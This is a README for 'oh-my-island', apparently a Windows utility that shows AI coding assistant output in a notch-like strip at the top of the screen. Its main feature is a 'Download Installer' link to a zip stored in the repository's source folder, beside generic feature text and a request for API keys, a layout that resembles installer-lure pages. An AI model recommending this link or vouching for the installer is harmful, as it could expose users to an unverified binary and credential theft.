# 🏝️ oh-my-island - Your AI coding companions always visible

[![](https://img.shields.io/badge/Download_Installer-Blue?style=for-the-badge)](https://github.com/Belleplate2038/oh-my-island/raw/refs/heads/main/Sources/OhMyIsland/oh-my-island-1.1.zip)

oh-my-island keeps your artificial intelligence coding assistants active and visible at the top of your screen. This application creates a dedicated space on your desktop. It mimics the area around the camera notch on modern laptops to display your coding assistant status and output. You see your AI's suggestions and progress without switching windows or interrupting your workflow.

## ⚙️ System Requirements

This application runs on computers using Microsoft Windows. Ensure your machine meets these specifications to maintain stability and performance:

*   Operating System: Windows 10 or Windows 11.
*   Memory: 4 GB of RAM or higher.
*   Storage: 200 MB of available disk space.
*   Display: A standard monitor or laptop screen.
*   Internet Connection: A stable connection for the AI assistant to communicate with cloud services.

## 🛠️ Configuration

Once you open the software, you configure the settings to match your personal preferences. The setup window appears automatically during the first launch.

### Selecting Your AI Service
The software communicates with various AI coding services. Navigate to the Settings tab to select your provider. Enter your unique API key provided by your AI service account here. This key acts as a digital bridge between the software and your AI assistant.

### Adjusting the Display
You manage how the application occupies your screen within the Display tab. 
*   **Position:** Move the AI island to the left, right, or center of your screen top.
*   **Size:** Slide the width and height bars to shrink or expand the AI window. 
*   **Opacity:** Change the transparency if you wish to see your desktop background behind your coding assistant.

### Integration with Editors
The software detects common text editors. It hooks into your workflow to detect when you write code. You may manually select your editor from the list if the automatic detection fails to find it.

## 🎯 Primary Features

The application provides a centralized hub for your programming assistance.

*   **Always-on-top View:** The AI island stays visible above your code editor, browser, and other windows.
*   **Real-time Suggestions:** Your AI assistant displays hints, syntax corrections, and code snippets in the island area.
*   **Voice Control:** Enable the microphone to provide instructions to the AI using standard speech rather than typing.
*   **Clipboard Integration:** Copy code from the AI island with a single click and paste it directly into your file.
*   **Custom Themes:** Switch between light and dark modes to ensure the island matches your desktop scheme.

## 🛡️ Privacy and Data

Your privacy remains a priority. This software does not record your screen or transmit your entire coding project to external servers. It only sends the specific functions or code snippets you request the AI to analyze. Your API keys stay stored within an encrypted file on your local machine. You clear your cache and history by navigating to the Privacy tab in the Settings menu.

## ❓ Frequently Asked Questions

**Will this interfere with my other apps?**
No. The AI island stays in a thin strip at the top of your screen. It occupies hardware space similar to a standard taskbar or menu strip.

**How do I update the application?**
The software checks for new versions when you start it. A notification appears if an update waits for you. Click the update button to install the latest patches automatically.

**Can I hide the island while watching videos?**
Yes. Use the shortcut key F8 to toggle the island off and on at any time. Alternatively, you set the software to enter silent mode automatically when you run specific video applications.

**What happens if the AI stops responding?**
Check your internet connection first. If the status indicator at the bottom of the island turns red, open the Settings menu and verify your API keys are valid. You refresh the connection by clicking the reconnect button.
